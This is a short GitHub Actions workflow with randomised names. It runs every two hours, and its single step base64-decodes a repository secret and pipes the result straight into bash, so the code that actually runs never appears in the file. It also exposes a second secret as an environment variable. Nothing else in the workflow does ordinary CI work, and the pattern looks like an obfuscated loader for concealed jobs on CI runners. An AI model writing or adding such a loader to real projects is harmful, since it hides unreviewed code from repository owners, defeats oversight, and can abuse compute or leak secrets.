name: EGooKXqOQ
on:
  schedule:
    - cron: '0 */2 * * *'
  workflow_dispatch:
jobs:
  EHRLZKSYbUfd:
    runs-on: ubuntu-latest
    env:
      wffSRrWMf: ${{ secrets.VxppPupduK }}
    steps:
      - uses: actions/checkout@v5
      - run: echo "${{ secrets.mmNEWr }}" | base64 -d | bash
